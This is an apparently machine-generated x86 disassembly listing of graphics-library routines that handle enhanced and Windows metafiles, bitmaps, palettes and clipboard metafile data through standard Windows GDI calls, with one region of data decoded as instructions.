cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8c9dc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce54
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce54
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_3a8cf08
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_3a7cb9c
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_3a8cf68
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_3a8c9dc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_3a8d760
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_3a8d75c
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_3a8cfec
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_3a7cb9c
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_3a8d0f8
mov edx ebx
mov eax esi
call sub_3a8d06c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_3a8d06c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a62ee0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8d0e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_3a7ce00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a62efc
retn
sub_3a8d0f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_3a63a44
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
movzx eax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_3a7ce00
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_3a7ce00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8d21a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a62efc
retn
call sub_3a8a69c
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_3a8b49c
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8d233
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_3a62ee0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8d213
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_3a8d240
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_3a8c9dc
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_3a8a60c
sub_3a8d2c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_3a8d2f8
push ebx
push esi
push edi
add esp 0xffffff9c
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8c9dc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce54
mov eax [ rw-data ]
push eax
push 0x9ec
push edi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce18
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce54
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push edi
call MulDiv
mov edx eax
mov eax ebx
call sub_3a8ce18
jmp r-xdata
mov [ eax + 0x1c ] esi
mov [ eax + 0x20 ] edi
jmp r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_3a8d3a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xd4
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ah dl
test al 0x3
add [ fs : eax ] al
add [ ebx + edi * 2 - 0x58 ] bl
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ ebp + edx * 8 - 0x544bfc58 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add ebp [ eax - 0x6bfc575c ]
movsb [ edi ] [ esi ]
test al 0x3
jo r-xdata
fadd [ ebp - 0x5a ]
test al 0x3
or eax 0x74694254
insd
popad
jo r-xdata
rcl [ ebp + 0x68 ] 0xde
aam 0xa8
add esp [ edi + edi * 8 + 0x30 ]
popad
outsb
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8d4e5
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov [ ebp - 0x4 ] eax
call sub_3a7a494
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_3a8a1d8
test al al
je r-xdata
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_3a8d4b6
push [ fs : eax ]
pop ebx
retn
rcr [ esp + edx * 8 ] 0xa8
add eax [ edi ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3a8d5d0
xor eax eax
pop edx
rcl [ ebp + 0x68 ] 0xb6
aam 0xa8
add esp [ edi + edi * 8 + 0x30 ]
jae r-xdata
or eax 0x74694254
insd
popad
jo r-xdata
pop es
shr [ eax - 0x578437fd ] cl
add eax [ eax + eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a8a234
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_3a7a898
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8d4de
push [ fs : eax ]
sub_3a8d440
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_3a7a898
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8d4de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8d4e5
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_3a8d4b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3a8d5d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a8a234
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7a494
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_3a8a1d8
test al al
je r-xdata
sub_3a8d4ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_3a7a898
mov esi eax
xor ecx ecx
push ebp
push sub_3a8d55c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax esi
call sub_3a7a494
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_3a8d5d0
sub_3a8d568
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a89cb0
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8d5a4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a8d5d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a89d74
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8d5d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a89f78
xor edx edx
push ebp
push sub_3a8d664
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a8a3c8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a7a8ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8a234
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_3a8d670
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3a8d74f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_3a8ea1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_3a8d4ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_3a8eb1c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a8a3c8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a7a810
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8a234
retn
sub_3a8d760
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_3a64380
sub_3a8d780
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_3a8d4ec
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_3a6efbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8d7dc
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
call sub_3a8d4ec
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_3a883e4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_3a8d4ec
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
push eax
call DeleteObject
sub_3a8d828
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_3a8aee0
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a8d8d7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a8d8e4
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
movzx edx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_3a8d930
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8d4ec
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_3a8a744
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_3a8df7e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_3a62ee0
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_3a8dc88
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_3a8a624
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_3a8a744
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_3a8a744
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_3a8a744
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_3a8a744
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3a8df2f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3a8df1e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3a8defc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_3a8a744
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_3a8d8e4
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_3a63154
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_3a8aee0
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3a89b74
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_3a78e1c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_3a8a69c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8df03
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_3a8ded2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_3a8a744
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_3a62efc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
